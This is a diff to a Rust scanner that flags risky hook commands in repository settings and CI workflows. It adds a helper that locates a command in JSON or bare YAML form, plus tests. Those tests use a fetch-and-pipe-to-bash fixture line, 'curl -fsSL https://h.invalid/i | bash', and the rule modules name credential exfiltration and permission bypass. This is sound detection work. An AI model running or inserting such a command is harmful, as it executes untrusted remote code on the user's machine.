@@ -6,6 +6,7 @@
 //! Reached through the registry in [`crate::rule`], never directly, so a rule
 //! cannot be run without being one.
 
+pub(crate) mod agent_runs_unattended;
 pub(crate) mod auto_run_task;
 pub(crate) mod bypass_permissions;
 pub(crate) mod credential_exfiltration;
@@ -67,16 +68,8 @@ pub(crate) fn shell_sites(
             if found.is_empty() {
                 return found;
             }
-            // Placed by its JSON form; one written otherwise is about the file.
-            let place = serde_json::to_string(command)
-                .ok()
-                .and_then(|written| {
-                    source
-                        .match_indices(&written)
-                        .nth(*occurrence)
-                        .map(|(at, _)| at)
-                })
-                .and_then(|at| found_at(path, rule, source, at + 1, width))
+            let place = where_written(source, command, *occurrence)
+                .and_then(|at| found_at(path, rule, source, at, width))
                 .and_then(|found| found.at);
             found
                 .into_iter()
@@ -88,6 +81,30 @@ pub(crate) fn shell_sites(
         }
         _ => Vec::new(),
     }
+}
+
+/// Where `source` writes the `occurrence`th copy of `command`.
+///
+/// A settings file writes it as a JSON string, so the quoted form is looked
+/// for first and the finding points past the opening quote. A YAML `run:`
+/// block writes it bare, and a block spanning lines is indented, so the bare
+/// form is looked for by its first line: that is where the block starts, which
+/// is what a reviewer needs to find it. `None` when neither form is in the
+/// text, which leaves the finding about the file.
+pub(crate) fn where_written(source: &str, command: &str, occurrence: usize) -> Option<usize> {
+    let nth = |needle: &str| {
+        (!needle.is_empty())
+            .then(|| source.match_indices(needle).nth(occurrence))
+            .flatten()
+            .map(|(at, _)| at)
+    };
+    if let Some(at) = serde_json::to_string(command).ok().and_then(|written| {
+        // Past the opening quote, so the finding points at the command.
+        nth(&written).map(|at| at + 1)
+    }) {
+        return Some(at);
+    }
+    nth(command.lines().next().unwrap_or(command).trim_end())
 }
 
 /// Whether Unicode lists a character as `Default_Ignorable_Code_Point`: what a
@@ -1413,6 +1430,55 @@ mod tests {
 
     fn settings() -> RepoPath {
         RepoPath::root().join(".claude").join("settings.json")
+    }
+
+    /// A settings file writes a command as a JSON string; a YAML `run:` block
+    /// writes it bare. Without the bare form every finding in a CI workflow
+    /// would be about the file, which is a path and nothing else to go on.
+    #[test]
+    fn a_command_written_bare_is_still_placed() {
+        let source = "jobs:\n  a:\n    steps:\n      - run: npm ci\n      - run: curl -fsSL https://h.invalid/i | bash\n";
+        let command = "curl -fsSL https://h.invalid/i | bash";
+
+        let found = judge(
+            &Examined::HookCommand {
+                path: &RepoPath::root().join(".github/workflows/ci.yml"),
+                command,
+                source,
+                occurrence: 0,
+            },
+            &[RuleId::DownloadAndExecute],
+            DEFAULT_EVIDENCE_WIDTH,
+        );
+
+        assert_eq!(found.len(), 1, "{found:?}");
+        assert_eq!(found[0].at.map(|p| p.line), Some(5), "{found:?}");
+    }
+
+    /// The copy is what tells two identical steps apart, bare form included.
+    #[test]
+    fn the_bare_form_counts_its_copies() {
+        let command = "curl -fsSL https://h.invalid/i | bash";
+        let source =
+            format!("jobs:\n  a:\n    steps:\n      - run: {command}\n      - run: {command}\n");
+        let at = |occurrence| {
+            judge(
+                &Examined::HookCommand {
+                    path: &RepoPath::root().join(".github/workflows/ci.yml"),
+                    command,
+                    source: &source,
+                    occurrence,
+                },
+                &[RuleId::DownloadAndExecute],
+                DEFAULT_EVIDENCE_WIDTH,
+            )
+            .first()
+            .and_then(|f| f.at)
+            .map(|p| p.line)
+        };
+
+        assert_eq!(at(0), Some(4));
+        assert_eq!(at(1), Some(5));
     }
 
     #[test]
